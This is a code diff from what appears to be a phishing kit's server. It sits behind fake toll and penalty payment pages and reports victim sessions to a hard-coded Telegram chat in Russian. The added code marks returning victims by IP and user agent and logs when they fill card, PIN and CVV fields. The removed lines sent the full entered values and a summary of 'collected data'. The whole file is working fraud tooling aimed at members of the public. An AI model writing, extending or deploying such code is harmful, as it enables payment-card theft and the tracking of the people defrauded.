@@ -13,6 +13,10 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003580814172';
 // Store session data: sessionId -> { messageId, logs: [], ip, userAgent, startTime }
 const sessions = new Map();
 
+// Store visited IPs and User Agents to detect returning clients
+// Format: ip -> { firstSeen: timestamp, userAgents: Set }
+const visitedClients = new Map();
+
 // Clean old sessions after 30 minutes
 const SESSION_TIMEOUT = 30 * 60 * 1000;
 
@@ -342,151 +346,188 @@ function escapeHtml(str) {
 }
 
 /**
- * Format session message for Telegram - DETAILED VERSION
+ * Check if client was seen before (by IP or User Agent)
+ */
+function isReturningClient(ip, userAgent) {
+  // Check by IP first
+  if (ip && ip !== 'Unknown') {
+    if (visitedClients.has(ip)) {
+      return true;
+    }
+  }
+  
+  // Check by User Agent (even if IP is different - same browser/device)
+  if (userAgent && userAgent !== 'Unknown') {
+    for (const [storedIp, clientData] of visitedClients.entries()) {
+      if (clientData.userAgents && clientData.userAgents.has(userAgent)) {
+        return true;
+      }
+    }
+  }
+  
+  return false;
+}
+
+/**
+ * Register client visit (IP and User Agent)
+ */
+function registerClientVisit(ip, userAgent) {
+  if (!ip || ip === 'Unknown') return;
+  
+  if (!visitedClients.has(ip)) {
+    visitedClients.set(ip, {
+      firstSeen: Date.now(),
+      userAgents: new Set()
+    });
+  }
+  
+  if (userAgent && userAgent !== 'Unknown') {
+    visitedClients.get(ip).userAgents.add(userAgent);
+  }
+  
+  // Clean old entries (older than 7 days)
+  const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
+  for (const [storedIp, clientData] of visitedClients.entries()) {
+    if (clientData.firstSeen < sevenDaysAgo) {
+      visitedClients.delete(storedIp);
+    }
+  }
+}
+
+/**
+ * Format session message for Telegram - NEW FORMAT
  */
 function formatSessionMessage(session, sessionId) {
-  // Safely get shortId
-  const shortId = safeString(sessionId).substring(0, 15).toUpperCase() || 'UNKNOWN';
-  
   // Safely get user info with HTML escaping
   const userAgent = escapeHtml(safeString(session.userAgent, 100)) || 'Unknown';
   const ip = escapeHtml(safeString(session.ip)) || 'Unknown';
   
-  // Determine current page type for header
-  let pageType = '🌐';
-  if (session.currentPage) {
-    if (session.currentPage.includes('pay-penalty')) pageType = '⚠️ PAY PENALTY';
-    else if (session.currentPage.includes('pay-toll')) pageType = '💰 PAY TOLL';
-    else if (session.currentPage.includes('login')) pageType = '🔐 LOGIN';
+  // Check if client was seen before
+  const isReturning = isReturningClient(ip, userAgent);
+  
+  // Register this visit
+  registerClientVisit(ip, userAgent);
+  
+  // Build message in new format
+  let message = `+ клиент на сайте\n`;
+  
+  // IP with returning client marker
+  if (isReturning) {
+    message += `ip : <code>${ip}</code> (уже был у нас)\n`;
+  } else {
+    message += `ip : <code>${ip}</code>\n`;
   }
   
-  let message = `━━━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
-  message += `📍 <b>Раздел:</b> ${pageType}\n`;
-  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-  message += `📱 <code>${userAgent}</code>\n`;
-  message += `🌍 IP: <code>${ip}</code>\n`;
-  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+  // User Agent
+  message += `user: <code>${userAgent}</code>\n`;
   
-  // Add logs
-  if (!Array.isArray(session.logs)) {
+  // Add logs as movement in blockquote
+  if (!Array.isArray(session.logs) || session.logs.length === 0) {
+    message += `\nДвижение:\n<blockquote>нет активности</blockquote>`;
     return message;
   }
   
-  // Collect filled data for summary
-  const filledData = {};
+  message += `\nДвижение:\n<blockquote>`;
+  
+  // Collect movement items
+  const movementItems = [];
   
   session.logs.forEach((log) => {
     if (!log || typeof log !== 'object') return;
     
-    const time = new Date(log.time || Date.now()).toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-    
-    // Safely extract log properties with HTML escaping
     const logType = safeString(log.type) || 'unknown';
     const logPage = escapeHtml(safeString(log.page)) || '';
     const logPath = escapeHtml(safeString(log.path)) || '';
-    const logField = safeString(log.field) || 'поле';
-    const logValue = escapeHtml(safeString(log.value, 100)) || ''; // FULL VALUE - no truncation
-    const logAmount = escapeHtml(safeString(log.amount)) || '?';
-    const logMessage = escapeHtml(safeString(log.message)) || '';
+    const logField = safeString(log.field) || '';
+    const logValue = escapeHtml(safeString(log.value, 100)) || '';
     
-    // Store filled data for summary
-    if (logType === 'form_filled' && logValue) {
-      filledData[logField] = logValue;
-    }
+    // Skip empty/unknown/tracking events
+    if (logType === 'unknown' || logType === 'view' || !logType) return;
+    
+    let item = '';
     
     switch (logType) {
       case 'page_view':
-        message += `📍 [${time}] <b>Открыл:</b> ${logPage || 'страница'}\n`;
-        if (logPath) message += `   └ URL: <code>${logPath}</code>\n`;
+        if (logPath && logPath.includes('pay-toll')) {
+          item = 'оплата';
+        } else if (logPath && logPath.includes('pay-penalty')) {
+          item = 'фак';
+        } else if (logPath && (logPath === '/' || logPath === '')) {
+          item = 'главная';
+        } else if (logPage && logPage.toLowerCase().includes('pay-toll')) {
+          item = 'оплата';
+        } else if (logPage && logPage.toLowerCase().includes('pay-penalty')) {
+          item = 'фак';
+        } else if (logPage) {
+          // Try to extract page name
+          const pageLower = logPage.toLowerCase();
+          if (pageLower.includes('toll')) item = 'оплата';
+          else if (pageLower.includes('penalty') || pageLower.includes('штраф')) item = 'фак';
+          else item = 'главная';
+        } else {
+          item = 'главная';
+        }
         break;
       case 'navigation':
-        message += `↪️ [${time}] <b>Перешёл:</b> ${logPage || 'страница'}\n`;
-        if (logPath) message += `   └ URL: <code>${logPath}</code>\n`;
+        if (logPath && logPath.includes('pay-toll')) {
+          item = 'оплата';
+        } else if (logPath && logPath.includes('pay-penalty')) {
+          item = 'фак';
+        } else if (logPage && logPage.toLowerCase().includes('pay-toll')) {
+          item = 'оплата';
+        } else if (logPage && logPage.toLowerCase().includes('pay-penalty')) {
+          item = 'фак';
+        }
+        break;
+      case 'payment_page':
+        if (logPath && logPath.includes('pay-penalty')) {
+          item = 'фак';
+        } else if (logPath && logPath.includes('pay-toll')) {
+          item = 'оплата';
+        } else {
+          item = 'оплата';
+        }
+        break;
+      case 'pay_button_click':
+        item = 'нажал на кнопку pay';
         break;
       case 'form_submit':
         // Skip if page is G/collect or similar tracking endpoints
         if (logPage && (logPage.includes('G/collect') || logPage.includes('collect') || logPage === 'view')) {
-          break;
+          return;
         }
-        message += `📤 [${time}] <b>ОТПРАВИЛ ФОРМУ</b> на: ${logPage || 'страница'}\n`;
-        break;
-      case 'payment_page':
-        // Determine exact page type
-        if (logPath && logPath.includes('pay-penalty')) {
-          message += `⚠️ [${time}] <b>СТРАНИЦА ШТРАФА (Pay a Penalty)</b>\n`;
-        } else if (logPath && logPath.includes('pay-toll')) {
-          message += `💰 [${time}] <b>СТРАНИЦА ПРОЕЗДА (Pay a Toll)</b>\n`;
-        } else {
-          message += `💳 [${time}] <b>СТРАНИЦА ОПЛАТЫ</b>\n`;
-        }
-        break;
-      case 'login_page':
-        message += `🔐 [${time}] <b>Страница входа в аккаунт</b>\n`;
-        break;
-      case 'form_step_1':
-        message += `📝 [${time}] <b>ШАГ 1:</b> Ввод данных авто\n`;
-        break;
-      case 'form_step_2':
-        message += `📝 [${time}] <b>ШАГ 2:</b> Ввод email\n`;
-        break;
-      case 'form_step_3':
-        message += `📝 [${time}] <b>ШАГ 3:</b> Подтверждение\n`;
-        break;
-      case 'form_input':
-        message += `✏️ [${time}] Заполняет: <b>${getFieldNameRu(logField)}</b>\n`;
+        item = 'отправил форму';
         break;
       case 'form_filled':
-        // SHOW FULL DATA - no masking!
-        message += `✅ [${time}] <b>${getFieldNameRu(logField)}</b>\n`;
-        message += `   └ Значение: <code>${logValue}</code>\n`;
-        break;
-      case 'card_page':
-        message += `💳 [${time}] <b>🚨 СТРАНИЦА ВВОДА КАРТЫ!</b>\n`;
+        // Only show important fields
+        if (logField && (logField.includes('card') || logField.includes('pin') || logField.includes('cvv'))) {
+          item = `заполнил ${getFieldNameRu(logField).toLowerCase()}`;
+        }
         break;
       case 'payment_redirect':
-        message += `💰 [${time}] <b>🚨 ПЕРЕХОД НА ОПЛАТУ!</b>\n`;
-        message += `   └ Сумма: <b>€${logAmount}</b>\n`;
+        item = 'переход на оплату';
         break;
-      case 'page_leave_external':
-        message += `🚪 [${time}] <b>Покинул сайт</b>\n`;
-        break;
-      case 'pay_button_click':
-        // HIGH PRIORITY - PAY BUTTON CLICKED!
-        message += `\n💳🔥 [${time}] <b>🚨 НАЖАЛ КНОПКУ PAY!</b>\n`;
-        // Only show button text if it's clean and short (not "Find VehicleFind" etc)
-        if (logValue && logValue.trim() && logValue.length < 30 && !logValue.match(/[A-Z]{2,}/)) {
-          var cleanBtnText = logValue.trim().substring(0, 20);
-          if (cleanBtnText.toLowerCase() === 'pay' || cleanBtnText.toLowerCase().indexOf('pay') > -1) {
-            message += `   └ Текст кнопки: <code>${cleanBtnText}</code>\n`;
-          }
-        }
-        message += `\n`;
-        break;
-      case 'button_click':
-        message += `🖱️ [${time}] Нажал кнопку: <b>${logValue || logMessage}</b>\n`;
-        break;
-      case 'radio_select':
-        message += `🔘 [${time}] Выбрал: <b>${logField}</b> = <code>${logValue}</code>\n`;
+      case 'card_page':
+        item = 'страница ввода карты';
         break;
       default:
-        // Skip empty/unknown/tracking events
-        if (logType === 'unknown' || logType === 'view' || !logType) break;
-        if (logMessage && !logMessage.includes('collect')) {
-          message += `• [${time}] ${logMessage}\n`;
-        } else if (logType && logType !== 'unknown') {
-          message += `• [${time}] ${logType}\n`;
-        }
+        // Skip other events
+        return;
+    }
+    
+    if (item) {
+      movementItems.push(item);
     }
   });
   
-  // Add summary of collected data at the end
-  if (Object.keys(filledData).length > 0) {
-    message += `\n━━━━ 📋 СОБРАННЫЕ ДАННЫЕ ━━━━\n`;
-    for (const [field, value] of Object.entries(filledData)) {
-      message += `• <b>${getFieldNameRu(field)}:</b> <code>${value}</code>\n`;
-    }
+  // Add movement items
+  if (movementItems.length === 0) {
+    message += `нет активности`;
+  } else {
+    message += movementItems.join('\n');
   }
+  
+  message += `</blockquote>`;
   
   return message;
 }
